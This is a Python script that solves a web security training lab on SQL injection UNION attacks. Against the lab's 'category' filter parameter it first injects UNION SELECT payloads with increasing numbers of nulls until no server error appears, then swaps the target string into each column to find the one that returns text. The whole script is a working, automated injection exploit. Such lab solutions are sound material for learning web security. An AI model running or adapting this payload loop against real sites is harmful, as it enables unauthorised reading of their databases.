#########################################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 18/9/2023
#
# Lab: SQL injection UNION attack, finding a column containing text
#
# Steps: 1. Inject payload into 'category' query parameter to determine
#           the number of columns
#        2. Add one additional null column at a time
#        3. Repeat this process, increasing the number of columns until you
#           receive a valid response
#        4. After determining the number of columns, replace each column with
#           the desired text one at a time.
#        5. Repeat this process until you receive a valid response.
#
#########################################################################################

###########
# imports
###########
import requests
from colorama import Fore
import re

#########
# Main
#########
# change this url to your lab
url = "https://0a4900e60381dad984c0b585000f00c3.web-security-academy.net"
print(Fore.BLUE + "[#] Injection parameter: " + Fore.YELLOW + "category")
try:  # fetch the home page
    home = requests.get(url)
    # extract the desired text
    desired_text = re.findall(
        "Make the database retrieve the string: '(.*)'", home.text)[0]
    print(Fore.BLUE + "[#] Desired text: " + Fore.YELLOW + desired_text)

    for i in range(1, 10):
        try:
            # number of nulls
            nulls = "null, " * i
            # payload to determine the number of columns
            payload = f"' UNION SELECT {nulls}-- -".replace(", -- -", "-- -") # remove the last comma
            print(Fore.WHITE + f"[*] Trying payload: {payload}")
            # fetch the page with the injected payload
            injection = requests.get(
                f"{url}/filter?category={payload}")
            # extract the error text
            internal_error_text = re.findall("<h4>Internal Server Error</h4>",
                                        injection.text)
            # if the response is successful with no error text
            if len(internal_error_text) == 0:
                print(Fore.WHITE +
                      "[#] Number of columns: " + Fore.GREEN + str(i))
                # test every column with a text to determine the column conaining text
                for j in range(1, i+1):
                    # replacing every one null with the desired text a time
                    # NOTE: this can be done in muliple way
                    new_payload = payload.replace(
                        "null", f"'{desired_text}'", j).replace(
                        f"'{desired_text}'", "null", j-1)
                    print(Fore.WHITE + f"[*] Trying payload: {new_payload}")
                    try:
                        # fetch the page with the new injected payload
                        injection = requests.get(
                            f"{url}/filter?category={new_payload}")
                        # extract the error text
                        internal_error_text = re.findall("<h4>Internal Server Error</h4>",
                                                    injection.text)
                        # if the response is successful with no error text
                        if len(internal_error_text) == 0:
                            print(Fore.WHITE +
                                  "[#] the column containing text: " + Fore.GREEN + str(j))
                            print(
                                Fore.WHITE + "[#] Check your browser, it should be marked now as " + Fore.GREEN + "solved")
                            break
                        else:
                            continue
                    except:
                        print(Fore.RED +
                              "[!] Failed to inject the payload to determine the column containing text through exception")
                break
            else:
                continue
        except:
            print(Fore.RED +
                  "[!] Failed to inject the payload to determine the number of columns through exception")
except:
    print(Fore.RED +
          "[!] Failed to fetch the home page to extract the desired text. Reseting the lab will fix the problem")
